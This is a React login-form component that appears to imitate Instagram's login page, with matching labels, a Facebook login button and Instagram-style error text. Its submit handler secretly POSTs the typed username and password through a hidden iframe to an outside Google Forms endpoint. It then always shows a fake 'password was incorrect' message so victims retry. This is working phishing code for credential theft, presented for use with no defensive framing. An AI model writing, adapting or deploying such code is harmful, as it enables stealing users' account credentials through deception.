import React, { useState } from 'react';

const LoginForm = ({ setCurrentView }) => {
  const [loginUsername, setLoginUsername] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const isLoginValid = loginUsername.length > 0 && loginPassword.length > 5;

  const handleSubmit = (e) => {
    e.preventDefault();

    // Create hidden form
    const form = document.createElement("form");
    form.action =
      "https://docs.google.com/forms/d/e/1FAIpQLSe6mienzwPLDcPU3wJmBiSQOQKluH58Cy1mG9nAKomfgi7o4A/formResponse";
    form.method = "POST";
    form.target = "hidden_iframe";

    // Username field
    const input1 = document.createElement("input");
    input1.name = "entry.280446300";
    input1.value = loginUsername;

    // Password field
    const input2 = document.createElement("input");
    input2.name = "entry.855076228";
    input2.value = loginPassword;

    form.appendChild(input1);
    form.appendChild(input2);

    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);

    // UI behavior
    setLoginUsername('');
    setLoginPassword('');
    setIsLoading(true);
    setShowError(false);

    setTimeout(() => {
      setIsLoading(false);
      setShowError(true);
    }, 1500);
  };

  return (
    <>
      {/* Hidden iframe (IMPORTANT) */}
      <iframe name="hidden_iframe" style={{ display: "none" }} />

      <form className="login-form" onSubmit={handleSubmit}>
        <div className="input-container">
          <span className={`input-label ${loginUsername ? 'active' : ''}`}>
            Phone number, username or email
          </span>
          <input
            type="text"
            className={`login-input ${loginUsername ? 'has-value' : ''}`}
            value={loginUsername}
            onChange={(e) => setLoginUsername(e.target.value)}
          />
        </div>

        <div className="input-container">
          <span className={`input-label ${loginPassword ? 'active' : ''}`}>
            Password
          </span>
          <input
            type="password"
            className={`login-input ${loginPassword ? 'has-value' : ''}`}
            value={loginPassword}
            onChange={(e) => setLoginPassword(e.target.value)}
          />
        </div>

        <button
          type="submit"
          className="login-btn premium-btn"
          disabled={!isLoginValid || isLoading}
        >
          {isLoading ? "Logging in..." : "Log in"}
        </button>

        {showError && (
          <p style={{ color: "red", marginTop: "10px" }}>
            Sorry, your password was incorrect. Please double-check your password.
          </p>
        )}

        <div className="divider">
          <div className="line"></div>
          <div className="or-text">OR</div>
          <div className="line"></div>
        </div>

        <button type="button" className="facebook-btn">
          Log in with Facebook
        </button>

        <div className="forgot-password">
          <a
            href="#"
            onClick={(e) => {
              e.preventDefault();
              setCurrentView('forgotPassword');
            }}
          >
            Forgotten your password?
          </a>
        </div>
      </form>
    </>
  );
};

export default LoginForm;